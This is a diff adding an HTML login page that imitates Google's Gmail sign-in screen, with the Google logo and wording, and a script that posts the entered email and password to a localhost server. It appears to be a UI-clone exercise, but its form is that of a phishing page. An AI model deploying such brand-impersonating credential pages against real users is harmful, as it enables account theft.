@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Login Page</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div class="parent">
+        <div class="logo"> <img src="Google_2015_logo.svg" alt=""></div>
+        <div class="sign">Sign in</div>
+        <div class="cont">to continue to gmail</div>
+        <form id="signin-form">
+            <div class="use">
+                <input class="username" type="email" id="username" placeholder="Email or phone" name="username" required>
+                <p class="forget">Forget email?</p>
+            </div>
+            <br>
+            <div style="margin-bottom: 45px;">
+                <input class="password" type="password" id="password" placeholder="Password" name="password" minlength="8" required>
+                <p class="forget">Forget password?</p>
+            </div>
+            <p class="text">Not your computer? Use Guest mode to sign in privately.</p>
+            <p class="learn">Learn more</p>
+            <br>
+            <p class="learn" style="display: inline-block; width: calc(65%); margin-left: -5%;">Create account</p>
+            <button type="submit">Next</button>
+            <br>
+            <br>
+        </form>
+    </div>
+
+    <script>
+        const form = document.getElementById('signin-form');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const response = await fetch('http://localhost:3000/signin', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username, password })
+            });
+
+            if (response.ok) {
+
+                window.location.href = 'home.html';
+            } else {
+                const errorMessage = await response.text();
+                console.error('Error:', errorMessage);
+                alert('Invalid data');
+            }
+        });
+    </script>
+
+</body>
+
+</html>
